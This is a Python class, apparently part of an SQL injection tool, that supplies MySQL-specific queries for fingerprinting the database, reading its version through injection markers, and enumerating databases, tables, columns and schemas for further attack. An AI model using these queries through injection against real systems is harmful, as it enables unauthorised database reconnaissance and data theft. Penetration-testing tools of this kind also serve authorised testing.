from src.engines.sql_injection_engine import SQLInjectionEngine


class SQLInjectionEngineMySQL(SQLInjectionEngine):

    def __init__(self) -> None:
        super().__init__()

    def database_names(self) -> str:
        return "SHOW DATABASES"
    def version(self) -> str:
        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'version:', @@version, '{SQLInjectionEngine.injection_suffix}')"

    def tables(self) -> str:
        return "SELECT table_name FROM information_schema.tables"

    def column_names(self, table_name=None):
        if table_name is None:
            raise AssertionError("Table name cannot be null")
        return f"SHOW `columns` FROM `{table_name}`"

    @staticmethod
    def schemas_names():
        """
        If we get the schemas we can attack them by typing USE `schema`
        inside the query to get more data
        """
        return "SELECT * FROM information_schema.schemata"

    @staticmethod
    def identify() -> str:
        return "EXISTS(select TABLE_NAME from information_schema.tables WHERE TABLE_NAME like 'INNODB%')"
